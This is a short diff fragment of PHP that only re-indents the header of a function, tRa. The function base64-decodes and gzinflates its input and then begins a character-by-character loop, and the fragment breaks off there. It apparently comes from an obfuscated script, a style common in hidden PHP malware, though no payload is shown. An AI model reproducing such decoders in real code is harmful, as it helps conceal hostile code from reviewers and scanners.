@@ -1,4 +1,4 @@
- function tRa($WuB)
+function tRa($WuB)
 { 
 $WuB=gzinflate(base64_decode($WuB));
  for($i=0;$i<strlen($WuB);$i++)
